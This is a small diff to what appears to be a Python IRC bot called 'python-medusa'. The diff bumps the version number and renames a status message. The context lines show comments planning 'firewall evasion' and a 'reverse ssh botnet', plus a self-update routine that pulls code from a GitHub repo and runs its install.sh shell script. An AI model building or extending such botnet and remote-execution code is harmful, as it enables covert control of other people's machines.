@@ -31,7 +31,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "5.6"                                                   # bot version
+version = "5.7"                                                   # bot version
 
 try:
     logfile(filename="bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -422,7 +422,7 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
     pid = os.getpid()
-    privmsg('[>]   Running Update.sh')
+    privmsg('[>]   Running install.sh')
     cmd = "sh /private/var/softupdated/code/*/install.sh %s" % pid
     for line in run_shell(cmd):
         log('[>]    ',line)
